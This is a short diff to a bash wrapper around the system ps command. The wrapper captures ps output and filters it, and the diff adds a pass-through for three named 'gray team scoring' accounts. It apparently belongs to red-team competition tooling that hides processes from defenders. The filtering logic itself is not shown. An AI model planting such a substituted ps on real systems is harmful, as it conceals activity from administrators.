@@ -1,6 +1,12 @@
 #!/bin/bash
 REAL_PS="/usr/bin/ps"
 
+# Pass straight through for gray team scoring accounts
+case "$(whoami)" in
+    kingneptune|paintythepirate|greyteamadmin) exec $REAL_PS "$@" ;;
+esac
+
+
 # Capture ps output, preserve exit code, then filter
 TMP_OUT=$("$REAL_PS" "$@" 2>&1)
 PS_RC=$?
